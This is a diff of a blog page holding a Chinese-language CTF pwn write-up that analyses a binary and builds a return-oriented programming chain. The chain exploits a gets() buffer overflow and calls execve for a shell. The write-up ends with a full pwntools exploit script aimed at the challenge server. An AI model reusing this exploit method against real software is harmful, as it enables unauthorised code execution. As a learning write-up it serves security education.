@@ -27,12 +27,12 @@
 
   
   
-    <meta name="description" content="ROP-chall Author:堇姬  題目來源ICED的pwn題目https:&#x2F;&#x2F;ctf.nicewhite.xyz&#x2F; 確認保護image看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。另外他有開NX，所以沒辦法寫shellcodeimage 分析ASMimage有gets 可以BOF，不過沒有其他function可以return過去，所以應該">
+    <meta name="description" content="ROP-chall Author:堇姬  題目來源ICED的pwn題目https:&#x2F;&#x2F;ctf.nicewhite.xyz&#x2F; 確認保護看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。另外他有開NX，所以沒辦法寫shellcode 分析ASM有gets 可以BOF，不過沒有其他function可以return過去，所以應該是要ROP 堆ROP exec">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ROP-chall-1">
 <meta property="og:url" content="http://example.com/2024/04/25/ROP-chall-1/index.html">
 <meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
-<meta property="og:description" content="ROP-chall Author:堇姬  題目來源ICED的pwn題目https:&#x2F;&#x2F;ctf.nicewhite.xyz&#x2F; 確認保護image看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。另外他有開NX，所以沒辦法寫shellcodeimage 分析ASMimage有gets 可以BOF，不過沒有其他function可以return過去，所以應該">
+<meta property="og:description" content="ROP-chall Author:堇姬  題目來源ICED的pwn題目https:&#x2F;&#x2F;ctf.nicewhite.xyz&#x2F; 確認保護看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。另外他有開NX，所以沒辦法寫shellcode 分析ASM有gets 可以BOF，不過沒有其他function可以return過去，所以應該是要ROP 堆ROP exec">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://hackmd.io/_uploads/Bkl1bnrvZC.png">
 <meta property="og:image" content="https://hackmd.io/_uploads/B1dwprPZ0.png">
@@ -223,11 +223,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -309,13 +309,12 @@
 <p>Author:堇姬</p>
 </blockquote>
 <h2 id="題目來源"><a href="#題目來源" class="headerlink" title="題目來源"></a>題目來源</h2><p>ICED的pwn題目<br><a target="_blank" rel="noopener" href="https://ctf.nicewhite.xyz/">https://ctf.nicewhite.xyz/</a></p>
-<h2 id="確認保護"><a href="#確認保護" class="headerlink" title="確認保護"></a>確認保護</h2><p><div class="img-item" data-src="https://hackmd.io/_uploads/Bkl1bnrvZC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Bkl1bnrvZC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。<br>另外他有開NX，所以沒辦法寫shellcode<br><div class="img-item" data-src="https://hackmd.io/_uploads/B1dwprPZ0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1dwprPZ0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<h2 id="分析ASM"><a href="#分析ASM" class="headerlink" title="分析ASM"></a>分析ASM</h2><p><div class="img-item" data-src="https://hackmd.io/_uploads/rJSkCrvZA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJSkCrvZA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>有gets 可以BOF，不過沒有其他function可以return過去，所以應該是要ROP</p>
+<h2 id="確認保護"><a href="#確認保護" class="headerlink" title="確認保護"></a>確認保護</h2><p><img src="https://hackmd.io/_uploads/Bkl1bnrvZC.png" alt="image"><br>看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。<br>另外他有開NX，所以沒辦法寫shellcode<br><img src="https://hackmd.io/_uploads/B1dwprPZ0.png" alt="image"></p>
+<h2 id="分析ASM"><a href="#分析ASM" class="headerlink" title="分析ASM"></a>分析ASM</h2><p><img src="https://hackmd.io/_uploads/rJSkCrvZA.png" alt="image"><br>有gets 可以BOF，不過沒有其他function可以return過去，所以應該是要ROP</p>
 <h2 id="堆ROP"><a href="#堆ROP" class="headerlink" title="堆ROP"></a>堆ROP</h2><ul>
 <li>execve(‘bin&#x2F;sh’)</li>
 </ul>
-<div class="table-responsive">
-<table class="table table-bordered table-striped">
+<table>
 <thead>
 <tr>
 <th>暫存器</th>
@@ -343,8 +342,7 @@
 <li>stack<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pop rax</span><br><span class="line">0x3b</span><br><span class="line">pop rdi</span><br><span class="line">command_addr_in_stack</span><br><span class="line">pop rsi</span><br><span class="line">0</span><br><span class="line">pop rdx;</span><br><span class="line">0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></li>
 </ul>
 <p>ROPgadget找位置</p>
-<div class="table-responsive">
-<table class="table table-bordered table-striped">
+<table>
 <thead>
 <tr>
 <th>暫存器</th>
@@ -378,13 +376,13 @@
 <td>無</td>
 </tr>
 </tbody></table>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/rJgjDLwWC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJgjDLwWC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/ryd7uLD-R.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ryd7uLD-R.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/r1KKlwPb0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1KKlwPb0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/rka3lvwbR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rka3lvwbR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/HyOuZDDb0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyOuZDDb0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p>輸入的shellcode存在0x4c3300<br><div class="img-item" data-src="https://hackmd.io/_uploads/rySc5wwb0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rySc5wwb0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p>要蓋0x70+0x8然後開始ret<br><div class="img-item" data-src="https://hackmd.io/_uploads/B1-xswPbA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1-xswPbA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><img src="https://hackmd.io/_uploads/rJgjDLwWC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ryd7uLD-R.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r1KKlwPb0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rka3lvwbR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HyOuZDDb0.png" alt="image"></p>
+<p>輸入的shellcode存在0x4c3300<br><img src="https://hackmd.io/_uploads/rySc5wwb0.png" alt="image"></p>
+<p>要蓋0x70+0x8然後開始ret<br><img src="https://hackmd.io/_uploads/B1-xswPbA.png" alt="image"></p>
 <h3 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;23.146.248.20&#x27;</span>, <span class="number">10009</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;rop0&#x27;)</span></span><br><span class="line">shellcode_addr=<span class="number">0x004c3300</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">ROPvar=&#123;</span><br><span class="line">    <span class="string">&#x27;shellcode&#x27;</span>:<span class="string">b&quot;/bin/bash\x00&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rax_ret&#x27;</span>:<span class="number">0x4516a7</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rdi_ret&#x27;</span>:<span class="number">0x4018c2</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rsi_ret&#x27;</span>:<span class="number">0x40f21e</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rdx_ret&#x27;</span>:<span class="number">0x4017cf</span>,</span><br><span class="line">    <span class="string">&#x27;syscall&#x27;</span>:<span class="number">0x4012d3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">STACKvar=&#123;</span><br><span class="line">    <span class="string">&#x27;rax_var&#x27;</span>:<span class="number">0x3b</span>,</span><br><span class="line">    <span class="string">&#x27;rdi_var&#x27;</span>:shellcode_addr,</span><br><span class="line">    <span class="string">&#x27;rsi_var&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;rdx_var&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">&#125;</span><br><span class="line">padding=<span class="number">0x70</span>+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*padding+flat(ROPvar[<span class="string">&#x27;pop_rax_ret&#x27;</span>],</span><br><span class="line">                          STACKvar[<span class="string">&#x27;rax_var&#x27;</span>],</span><br><span class="line">                          ROPvar[<span class="string">&#x27;pop_rdi_ret&#x27;</span>],</span><br><span class="line">                          STACKvar[<span class="string">&#x27;rdi_var&#x27;</span>],</span><br><span class="line">                          ROPvar[<span class="string">&#x27;pop_rdx_ret&#x27;</span>],</span><br><span class="line">                          STACKvar[<span class="string">&#x27;rdx_var&#x27;</span>],</span><br><span class="line">                          ROPvar[<span class="string">&#x27;pop_rsi_ret&#x27;</span>],</span><br><span class="line">                          STACKvar[<span class="string">&#x27;rsi_var&#x27;</span>],</span><br><span class="line">                          ROPvar[<span class="string">&#x27;syscall&#x27;</span>])</span><br><span class="line"></span><br><span class="line">r.sendline(ROPvar[<span class="string">&#x27;shellcode&#x27;</span>])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
       
@@ -473,7 +471,7 @@
     
       <div>
         <span class="icon-brush"></span>
-        149.8k
+        149.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         13:10
@@ -525,11 +523,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -654,7 +652,7 @@
           url: "http://example.com/2024/04/25/ROP-chall-1/",
           excerpt: "",
           description: "",
-          stripContent: "ROP-chall Author:堇姬  題目來源ICED的pwn題目https://ctf.nicewhite.xyz/ 確認保護image看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。另外他有開NX，所以沒辦法寫shellcodeimage 分析ASMimage有gets 可以BOF，不過沒有其他function可以return過去，所以應該是要ROP 堆ROP execve(‘bin&amp;#x2F;sh’)      暫存器 值    rax",
+          stripContent: "ROP-chall Author:堇姬  題目來源ICED的pwn題目https://ctf.nicewhite.xyz/ 確認保護看到有開Stack canary，但溢出後卻沒有報stack canary的錯誤，所以應該是沒開。另外他有開NX，所以沒辦法寫shellcode 分析ASM有gets 可以BOF，不過沒有其他function可以return過去，所以應該是要ROP 堆ROP execve(‘bin&amp;#x2F;sh’)     暫存器 值    rax 0x3b   rdi 要執行的",
           date: "Thu Apr 25 2024 18:44:56 GMT+0800",
           updated: "Sat Apr 27 2024 15:05:10 GMT+0800",
           cover: "/images/banner.webp",
